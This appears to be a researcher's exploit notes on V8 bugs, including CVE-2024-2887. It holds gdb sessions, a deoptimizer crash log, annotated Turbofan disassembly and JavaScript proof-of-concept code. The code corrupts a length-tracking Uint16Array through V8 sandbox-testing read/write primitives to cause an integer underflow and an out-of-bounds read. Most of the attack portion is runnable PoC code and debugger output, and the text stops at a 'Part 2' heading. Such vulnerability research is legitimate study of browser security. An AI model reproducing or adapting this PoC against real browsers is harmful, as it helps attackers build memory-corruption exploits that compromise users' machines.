   0x7ffff599d602 <_ZNK2v88internal11Deoptimizer21ComputeInputFrameSizeEv+66>:	mov    rax,QWORD PTR [rbx+0x10]
   0x7ffff599d606 <_ZNK2v88internal11Deoptimizer21ComputeInputFrameSizeEv+70>:	mov    ecx,DWORD PTR [rax+0x17]
   0x7ffff599d609 <_ZNK2v88internal11Deoptimizer21ComputeInputFrameSizeEv+73>:	and    cl,0xf
   0x7ffff599d60c <_ZNK2v88internal11Deoptimizer21ComputeInputFrameSizeEv+76>:	add    cl,0xf5
   0x7ffff599d60f <_ZNK2v88internal11Deoptimizer21ComputeInputFrameSizeEv+79>:	cmp    cl,0x2
   0x7ffff599d612 <_ZNK2v88internal11Deoptimizer21ComputeInputFrameSizeEv+82>:	jae    0x7ffff599d732 <_ZNK2v88internal11Deoptimizer21ComputeInputFrameSizeEv+370>
-----------------------------------------------------------------------------------------------------------------------------

Thread 1 "d8" hit Breakpoint 23, v8::internal::ReadMaybeUnalignedValue<unsigned short> (p=<optimized out>) at ../../src/common/ptr-compr.h:174
174	    return base::Memory<V>(p);
gdb$ bt
#0  v8::internal::ReadMaybeUnalignedValue<unsigned short> (p=<optimized out>) at ../../src/common/ptr-compr.h:174
#1  _ZNK2v88internal10HeapObject9ReadFieldItTnNSt4__Cr9enable_ifIXoosr3std13is_arithmeticIT_EE5valuesr3std7is_enumIS5_EE5valueEiE4typeELi0EEES5_m (offset=0x1a, this=<optimized out>) at ../../src/objects/heap-object.h:247
#2  v8::internal::TorqueGeneratedSharedFunctionInfo<v8::internal::SharedFunctionInfo, v8::internal::HeapObject>::formal_parameter_count (this=<optimized out>) at gen/torque-generated/src/objects/shared-function-info-tq-inl.inc:157
#3  v8::internal::SharedFunctionInfo::internal_formal_parameter_count_with_receiver (this=<optimized out>) at ../../src/objects/shared-function-info-inl.h:235
#4  v8::internal::Deoptimizer::ComputeIncomingArgumentSize (shared=...) at ../../src/deoptimizer/deoptimizer.cc:2251
#5  v8::internal::Deoptimizer::ComputeInputFrameAboveFpFixedSize (this=this@entry=0x55555565a050) at ../../src/deoptimizer/deoptimizer.cc:2177
#6  v8::internal::Deoptimizer::ComputeInputFrameSize (this=0x55555565a050, this@entry=0x555555659f50) at ../../src/deoptimizer/deoptimizer.cc:2215
#7  0x00007ffff599cbe9 in v8::internal::Deoptimizer::Deoptimizer (this=0x555555659f50, isolate=isolate@entry=0x5555555e2000, function=function@entry=..., kind=v8::internal::DeoptimizeKind::kEager, from=from@entry=0x7fff6000074d, fp_to_sp_delta=fp_to_sp_delta@entry=0x30) at ../../src/deoptimizer/deoptimizer.cc:551
#8  0x00007ffff5999daa in v8::internal::Deoptimizer::New (raw_function=0xf280029974d, kind=v8::internal::DeoptimizeKind::kEager, from=0x7fff6000074d, fp_to_sp_delta=0x30, isolate=0x5555555e2000) at ../../src/deoptimizer/deoptimizer.cc:262
#9  0x00007fff7f3800f2 in ?? ()
#10 0x00007fffffffd380 in ?? ()
#11 0x0000555555667340 in ?? ()
#12 0x0000555555619510 in ?? ()
#13 0x00000f2800000000 in ?? ()
#14 0x00005555555e2080 in ?? ()
#15 0x0000000000000e3d in ?? ()
#16 0x0000000000000087 in ?? ()
#17 0x00007fff92ff0000 in ?? ()
#18 0x00000000000000a3 in ?? ()
#19 0x0000000000000000 in ?? ()
gdb$ x/gx $r14
0xf2800299622:	0x11001002000c0002
(reverse-i-search)`se': r --expoQuitc --allow-natives-syntax --sandbox-testing --trace-turbo   --print-code /util/sbx_fuzz/CheckedUint64Bounds_corpus/regress-crbug-686737/regress-crbug-686737.js
gdb$ set *0xf2800299622=0xc0f02                     622=0xc0f02
gdb$ stepi
-----------------------------------------------------------------------------------------------------------------------[e[1m][regs]
  RAX: 0x00007FFFF7F0E3F8  RBX: 0x000055555565A050  RBP: 0x00007FFFFFFFD290  RSP: 0x00007FFFFFFFD270  [e[1m][e[0;31m]o d I t s Z a P c
  RDI: 0x0000555555659F50  RSI: 0x000055555565D2C0  RDX: 0x0000000000000330  RCX: 0x0000000000000300  RIP:[e[0;31m] 0x00007FFFF599D5FE
  R8 : 0x0000000000051E90  R9 : 0x0000000000000030  R10: 0x00007FFF7F3800F2  R11: 0x0000000000000087  R12: 0x0000000000000F02
  R13: 0x0000000000000030  R14: 0x00000F2800299622  R15: 0x00000F2800000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B
-----------------------------------------------------------------------------------------------------------------------[e[1m][code]
=> 0x7ffff599d5fe <_ZNK2v88internal11Deoptimizer21ComputeInputFrameSizeEv+62>:	mov    r15d,DWORD PTR [rbx+0x30]
   0x7ffff599d602 <_ZNK2v88internal11Deoptimizer21ComputeInputFrameSizeEv+66>:	mov    rax,QWORD PTR [rbx+0x10]
   0x7ffff599d606 <_ZNK2v88internal11Deoptimizer21ComputeInputFrameSizeEv+70>:	mov    ecx,DWORD PTR [rax+0x17]
   0x7ffff599d609 <_ZNK2v88internal11Deoptimizer21ComputeInputFrameSizeEv+73>:	and    cl,0xf
   0x7ffff599d60c <_ZNK2v88internal11Deoptimizer21ComputeInputFrameSizeEv+76>:	add    cl,0xf5
   0x7ffff599d60f <_ZNK2v88internal11Deoptimizer21ComputeInputFrameSizeEv+79>:	cmp    cl,0x2
   0x7ffff599d612 <_ZNK2v88internal11Deoptimizer21ComputeInputFrameSizeEv+82>:	jae    0x7ffff599d732 <_ZNK2v88internal11Deoptimizer21ComputeInputFrameSizeEv+370>
   0x7ffff599d618 <_ZNK2v88internal11Deoptimizer21ComputeInputFrameSizeEv+88>:	add    rax,0x17
-----------------------------------------------------------------------------------------------------------------------------
v8::internal::Deoptimizer::ComputeInputFrameSize (this=0x55555565a150, this@entry=0x555555659f50) at ../../src/deoptimizer/deoptimizer.cc:2216
2216	  unsigned result = fixed_size_above_fp + fp_to_sp_delta_;
gdb$ c
Continuing.
# Ignoring debug check failure in ../../src/deoptimizer/deoptimizer.cc, line 2217: CodeKindCanDeoptimize(compiled_code_->kind())


#
# Safely terminating process due to error in ../../src/deoptimizer/deoptimizer.cc, line 2243
# The following harmless error was encountered: Check failed: fixed_size_above_fp + (stack_slots * kSystemPointerSize) - CommonFrameConstants::kFixedFrameSizeAboveFp + outgoing_size == result (30736 vs. 1432748912).
#
#
#
#FailureMessage Object: 0x7fffffffcf60
==== C stack trace ===============================

    /util/v8_sandbox/v8/out/test/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x13) [0x7ffff3ff53d3]
    /util/v8_sandbox/v8/out/test/libv8_libplatform.so(+0x1631d) [0x7ffff7faf31d]
    /util/v8_sandbox/v8/out/test/libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x17d) [0x7ffff3fd67fd]
    /util/v8_sandbox/v8/out/test/libv8.so(+0x199d6ab) [0x7ffff599d6ab]
    /util/v8_sandbox/v8/out/test/libv8.so(+0x199cbe9) [0x7ffff599cbe9]
    /util/v8_sandbox/v8/out/test/libv8.so(+0x1999daa) [0x7ffff5999daa]
    [0x7fff7f3800f2]
```

```js

let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrOf(obj) {
    return Sandbox.getAddressOf(obj);
  }
  
  function v8_read64(addr) {
    return sandboxMemory.getBigUint64(Number(addr), true);
  }
  
  function v8_write64(addr, val) {
    return sandboxMemory.setBigInt64(Number(addr), val, true);
  }



const gsab = new SharedArrayBuffer(0x16,{"maxByteLength":0x4242});
const u16arr = new Uint16Array(gsab,0x10);
// u16arr[1] = 1;
// console.log(u16arr[1]);

function foo(obj,index, val) {
    obj[index] += val;
    return obj[index];

}

function test(iii,val) {
    return foo(u16arr, iii, val);
}

for (var i = 0; i < 0x10000; ++i) {
    test(1,0);
}
// %DebugPrint(gsab);
%DebugPrint(u16arr);
console.log(addrOf(u16arr));
console.log(v8_read64(addrOf(u16arr)+0x17));

v8_write64(addrOf(u16arr)+0x19,0x2e00000n);

%DebugPrint(u16arr);
d8.file.execute('v8/test/mjsunit/wasm/wasm-module-builder.js');
const builder = new WasmModuleBuilder();
let $sig_i_l = builder.addType(kSig_i_l); //let kSig_i_l = makeSig([kWasmI64], [kWasmI32]);

builder.addFunction("func0", $sig_i_l).exportFunc().addBody([ // function 1 convert from int32 to int64
  kExprLocalGet, 0,
  kExprI32ConvertI64,
]);
let instance = builder.instantiate();
instance.exports.func0(0n);
let target = Number(0x20000000000n);
%DebugPrint(target);

%SystemBreak();

var ret = test(target,0);
console.log(ret);
-------

DebugPrint: 0x2e6400049a49: [JSTypedArray]
 - map: 0x2e640028cd31 <Map[76](RAB_GSAB_UINT16ELEMENTS)> [FastProperties]
 - prototype: 0x2e6400288ba1 <Object map = 0x2e6400288b35>
 - elements: 0x2e6400000ec1 <ByteArray[0]> [RAB_GSAB_UINT16ELEMENTS]
 - embedder fields: 2
 - cpp_heap_wrappable: 0
 - buffer: 0x2e6400049a05 <SharedArrayBuffer map = 0x2e6400290e19>
 - byte_offset: 16
 - byte_length: 0
 - length: 3
 - data_ptr: 0x2e6700000010
   - base_pointer: (nil)
   - external_pointer: 0x2e6700000010
 - length-tracking
 - properties: 0x2e6400000725 <FixedArray[0]> 
 - All own properties (excluding elements): {}
 - elements: 0x2e6400000ec1 <ByteArray[0]> {--------------------------------------------------------------------------- X 
         0-2: 0
 }

info proc mappings
process 3508781
Mapped address spaces:

          Start Addr           End Addr       Size     Offset  Perms  objfile
      0x24d5d77a7000     0x24d5d77a8000     0x1000        0x0  r--p
      0x2d7700000000     0x2d7700001000     0x1000        0x0  rw-p
      0x2d7700001000     0x2d7700040000    0x3f000        0x0  ---p
      0x2d7700040000     0x2d77000c0000    0x80000        0x0  rw-p
      0x2d77000c0000     0x2d7740000000 0x3ff40000        0x0  ---p
      0x2e5c00000000     0x2e6400000000 0x800000000        0x0  ---p-------------------------------------------------- X
      0x2e6400000000     0x2e6400010000    0x10000        0x0  r--p
      0x2e6400010000     0x2e6400020000    0x10000        0x0  ---p
      0x2e6400020000     0x2e6400040000    0x20000        0x0  r--p
      0x2e6400040000     0x2e6400149000   0x109000        0x0  rw-p
      0x2e6400149000     0x2e6400180000    0x37000        0x0  ---p
      0x2e6400180000     0x2e640027d000    0xfd000        0x0  r--p
      0x2e640027d000     0x2e6400280000     0x3000        0x0  ---p
      0x2e6400280000     0x2e6400300000    0x80000        0x0  rw-p
      0x2e6400300000     0x2e6500000000 0xffd00000        0x0  ---p
      0x2e6500000000     0x2e6500100000   0x100000        0x0  rw-p
      0x2e6500100000     0x2e6700000000 0x1fff00000        0x0  ---p
      0x2e6700000000     0x2e6700001000     0x1000        0x0  rw-p
      0x2e6700001000     0x2f6c00000000 0x104fffff000        0x0  ---p
      0x35c80947d000     0x35c80947e000     0x1000        0x0  rwxp -------------------------------------------------- WASM Code here


```




### CVE-2024-2887


Part 1: GSAB length_tracking integer under-overflow


```js

let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrOf(obj) {
    return Sandbox.getAddressOf(obj);
  }
  
  function v8_read64(addr) {
    return sandboxMemory.getBigUint64(Number(addr), true);
  }
  
  function v8_write64(addr, val) {
    return sandboxMemory.setBigInt64(Number(addr), val, true);
  }



const gsab = new SharedArrayBuffer(0x16,{"maxByteLength":0x4242});
const u16arr = new Uint16Array(gsab,0x10);
// u16arr[1] = 1;
// console.log(u16arr[1]);

function foo(obj,index, val) {
    obj[index] += val;
    return obj[index];

}

function test(iii,val) {
    return foo(u16arr, iii, val);
}

for (var i = 0; i < 0x10000; ++i) {
    test(1,0);
}
// %DebugPrint(gsab);
%DebugPrint(u16arr);
console.log(addrOf(u16arr));
console.log(v8_read64(addrOf(u16arr)+0x17));

v8_write64(addrOf(u16arr)+0x19,0x2e00000n);

%DebugPrint(u16arr);
let target = Number(0x20000000000n);
%DebugPrint(target);

%SystemBreak();

var ret = test(target,0);
console.log(ret);



```


```js

gdb$ r --expose-gc --allow-natives-syntax --sandbox-testing --trace-turbo --print-code  pocs/oobr.js
...
--- Optimized code ---
optimization_id = 1
source_position = 594
kind = TURBOFAN
name = test
stack_slots = 13
compiler = turbofan
address = 0x240000040dd5
0x7fff60000600     0  488d1df9ffffff       REX.W leaq rbx,[rip+0xfffffff9]
0x7fff60000607     7  483bd9               REX.W cmpq rbx,rcx
0x7fff6000060a     a  740d                 jz 0x7fff60000619  <+0x19>
0x7fff6000060c     c  ba86000000           movl rdx,0x86
0x7fff60000611    11  41ff9598540000       call [r13+0x5498]
0x7fff60000618    18  cc                   int3l
0x7fff60000619    19  8b59f4               movl rbx,[rcx-0xc]
0x7fff6000061c    1c  490b9de8010000       REX.W orq rbx,[r13+0x1e8]
0x7fff60000623    23  f6431a20             testb [rbx+0x1a],0x20
0x7fff60000627    27  0f85131e3d1f         jnz 0x7fff7f3d2440  (CompileLazyDeoptimizedCode)    ;; near builtin entry
0x7fff6000062d    2d  55                   push rbp
0x7fff6000062e    2e  4889e5               REX.W movq rbp,rsp
0x7fff60000631    31  56                   push rsi
0x7fff60000632    32  57                   push rdi
0x7fff60000633    33  50                   push rax
0x7fff60000634    34  4883ec40             REX.W subq rsp,0x40
0x7fff60000638    38  488975c8             REX.W movq [rbp-0x38],rsi
0x7fff6000063c    3c  493b65a0             REX.W cmpq rsp,[r13-0x60] (external value (StackGuard::address_of_jslimit()))
0x7fff60000640    40  0f8665040000         jna 0x7fff60000aab  <+0x4ab>
0x7fff60000646    46  48badd2d0500a0240000 REX.W movq rdx,0x24a000052ddd    ;; object: 0x24a000052ddd <Uint16Array map = 0x24a00028ccc1>
0x7fff60000650    50  8b4a13               movl rcx,[rdx+0x13]
0x7fff60000653    53  41baffffffff         movl r10,0xffffffff
0x7fff60000659    59  493bca               REX.W cmpq rcx,r10
0x7fff6000065c    5c  760d                 jna 0x7fff6000066b  <+0x6b> JUMP
0x7fff6000065e    5e  ba02000000           movl rdx,0x2
0x7fff60000663    63  41ff9598540000       call [r13+0x5498]
0x7fff6000066a    6a  cc                   int3l
0x7fff6000066b    6b  8b7a0f               movl rdi,[rdx+0xf]
0x7fff6000066e    6e  4903fe               REX.W addq rdi,r14
0x7fff60000671    71  448bc1               movl r8,rcx
0x7fff60000674    74  4183e002             andl r8,0x2
0x7fff60000678    78  48894db8             REX.W movq [rbp-0x48],rcx
0x7fff6000067c    7c  48897dc0             REX.W movq [rbp-0x40],rdi
0x7fff60000680    80  f6c101               testb rcx,0x1
0x7fff60000683    83  0f8553000000         jnz 0x7fff600006dc  <+0xdc> JUMP
0x7fff60000689    89  4585c0               testl r8,r8
0x7fff6000068c    8c  0f850d000000         jnz 0x7fff6000069f  <+0x9f>
0x7fff60000692    92  4c8b4227             REX.W movq r8,[rdx+0x27]
0x7fff60000696    96  49c1e81d             REX.W shrq r8, 29
0x7fff6000069a    9a  e935000000           jmp 0x7fff600006d4  <+0xd4>
0x7fff6000069f    9f  4c8b421f             REX.W movq r8,[rdx+0x1f]
0x7fff600006a3    a3  49c1e81d             REX.W shrq r8, 29
0x7fff600006a7    a7  4c8b4f13             REX.W movq r9,[rdi+0x13]
0x7fff600006ab    ab  49c1e91d             REX.W shrq r9, 29
0x7fff600006af    af  4c8b5a17             REX.W movq r11,[rdx+0x17]
0x7fff600006b3    b3  49c1eb1d             REX.W shrq r11, 29
0x7fff600006b7    b7  4d03d8               REX.W addq r11,r8
0x7fff600006ba    ba  4d3bd9               REX.W cmpq r11,r9
0x7fff600006bd    bd  0f8608000000         jna 0x7fff600006cb  <+0xcb>
0x7fff600006c3    c3  4533c9               xorl r9,r9
0x7fff600006c6    c6  e903000000           jmp 0x7fff600006ce  <+0xce>
0x7fff600006cb    cb  4d8bc8               REX.W movq r9,r8
0x7fff600006ce    ce  49d1e9               REX.W shrq r9, 1
0x7fff600006d1    d1  4d8bc1               REX.W movq r8,r9
0x7fff600006d4    d4  4533c9               xorl r9,r9
0x7fff600006d7    d7  e987000000           jmp 0x7fff60000763  <+0x163>
0x7fff600006dc    dc  f6c102               testb rcx,0x2
0x7fff600006df    df  0f8559000000         jnz 0x7fff6000073e  <+0x13e> NOT JUMP
0x7fff600006e5    e5  57                   push rdi
0x7fff600006e6    e6  48be55d62900a0240000 REX.W movq rsi,0x24a00029d655    ;; object: 0x24a00029d655 <ScriptContext[7]>
0x7fff600006f0    f0  48bbe04757f6ff7f0000 REX.W movq rbx,0x7ffff65747e0    ;; external reference (Runtime::GrowableSharedArrayBufferByteLength)
0x7fff600006fa    fa  b801000000           movl rax,0x1
0x7fff600006ff    ff  e8fcff791f           call 0x7fff7f7a0700  (CEntry_Return1_ArgvOnStack_NoBuiltinExit)    ;; near builtin entry
             -> Runtime Get byte_length :? RAX: 0x000000000000002C
              #1  v8::internal::Runtime_GrowableSharedArrayBufferByteLength (args_length=0x1, args_object=0x7fffffffd428, isolate=0x5555555e2000) at ../../src/runtime/runtime-typedarray.cc:67
              RUNTIME_FUNCTION(Runtime_GrowableSharedArrayBufferByteLength) {
                    HandleScope scope(isolate);
                    DCHECK_EQ(1, args.length());
                    Handle<JSArrayBuffer> array_buffer = args.at<JSArrayBuffer>(0);

                    CHECK_EQ(0, array_buffer->byte_length());
                    size_t byte_length = array_buffer->GetBackingStore()->byte_length();
                    return *isolate->factory()->NewNumberFromSize(byte_length);
                }

0x7fff60000704   104  a801                 test al,0x1
0x7fff60000706   106  0f85c8030000         jnz 0x7fff60000ad4  <+0x4d4> NOT JUMP
0x7fff6000070c   10c  d1f8                 sarl rax, 1 <------------ RAX: 0x000000000000002C
0x7fff6000070e   10e  c5832ac0             vcvtlsi2sd xmm0,xmm15,rax <-------- RAX: 0x0000000000000016
0x7fff60000712   112  48badd2d0500a0240000 REX.W movq rdx,0x24a000052ddd    ;; object: 0x24a000052ddd <Uint16Array map = 0x24a00028ccc1>
0x7fff6000071c   11c  488b4a17             REX.W movq rcx,[rdx+0x17] <------------------ RCX: 0x00000002E0000000 OUR VALUE (v8_write64(addrOf(u16arr)+0x19,0x2e00000n);)
0x7fff60000720   120  48c1e91d             REX.W shrq rcx, 29 <--------RCX: 0x0000000000000017
0x7fff60000724   124  c4e1fb2cf8           vcvttsd2siq rdi,xmm0 <------------- RDI: 0x0000000000000016
0x7fff60000729   129  482bf9               REX.W subq rdi,rcx <-------------- SUB UNDERFLOW
0x7fff6000072c   12c  48d1ef               REX.W shrq rdi, 1
0x7fff6000072f   12f  4c8bc7               REX.W movq r8,rdi 
0x7fff60000732   132  488b7dc0             REX.W movq rdi,[rbp-0x40]
0x7fff60000736   136  8b4db8               movl rcx,[rbp-0x48]
0x7fff60000739   139  e91f000000           jmp 0x7fff6000075d  <+0x15d>
 13e  REX.W movq r8,[rdi+0x13]
   142  REX.W shrq r8, 29
   146  REX.W movq r9,[rdx+0x17]
   14a  REX.W shrq r9, 29
   14e  REX.W cmpq r9,r8
   151  ja 0x774ae0000ade  B17 <+0x4de>
B18:
   157  REX.W subq r8,r9 
   15a  REX.W shrq r8, 1
B19,20:
   0x7fff6000075d 15d  movl r9,0x1
B21:
   163  movl r11,[rdx+0x37]
   167  movl r10,0xffffffff
   16d  REX.W cmpq r11,r10
   170  jna 0x774ae000077f  <+0x17f>  ---- JUMP
   172  movl rdx,0x2
   177  call [r13+0x54c8]
   17e  int3l
   17f  REX.W movq r12,[rdx+0x2f]
   183  REX.W shrq r12, 24
   187  REX.W addq r12,r14
   18a  REX.W movq [rbp-0x30],r11
   18e  REX.W movq r15,[rbp+0x18]
   192  REX.W movq [rbp-0x28],r12
   196  testb r15,0x1
   19a  jnz 0x774ae0000ae6  B23 <+0x4e6>
B22:
   1a0  REX.W movq rax,r15
   1a3  sarl rax, 1
   1a5  REX.W movsxlq rax,rax
B24:
   1a8  REX.W cmpq rax,r8 ~~~~~~~~ we controlled rax and r8 is very large here lead to oob!
   1ab  jnc 0x774ae0000b56  <+0x556>
   1b1  movl r8,r11
   1b4  movl r10,0xffffffff
   1ba  REX.W cmpq r8,r10
   1bd  jna 0x774ae00007cc  <+0x1cc>
   1bf  movl rdx,0x2
   1c4  call [r13+0x54c8]
   1cb  int3l
   1cc  REX.W addq r8,r12
   1cf  movzxwl r8,[r8+rax*2] 
   -----------------------------------------------------------------------------------------------------------------------[e[1m][regs]
  RAX: 0x0000020000000000  RBX: 0x00007FFFF65747E0  RBP: 0x00007FFFFFFFD488  RSP: 0x00007FFFFFFFD430  [e[1m][e[0;31m]o d I t s z a p c
  RDI: 0x00000D6400052D99  RSI: 0x00000D640029D655  RDX: 0x00000D6400052DDD  RCX: 0x0000000000000069  RIP:[e[0;31m] 0x00007FFF600007CF
  R8 : 0x00000D6700000010  R9 : 0x0000000000000001  R10: 0x00000000FFFFFFFF  R11: 0x0000000000000000  R12: 0x00000D6700000010
  R13: 0x00005555555E2080  R14: 0x00000D6400000000  R15: 0x00000D6400052F11
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B
-----------------------------------------------------------------------------------------------------------------------[e[1m][code]
=> 0x7fff600007cf:	movzx  r8d,WORD PTR [r8+rax*2]
   0x7fff600007d4:	mov    r10d,0xffffffff
   0x7fff600007da:	cmp    r8,r10
   0x7fff600007dd:	jbe    0x7fff600007ec
   0x7fff600007df:	mov    edx,0x2
   0x7fff600007e4:	call   QWORD PTR [r13+0x5498]
   0x7fff600007eb:	int3
   0x7fff600007ec:	mov    rbx,QWORD PTR [rbp+0x20]

```

Part 2: Out-of-bound read 
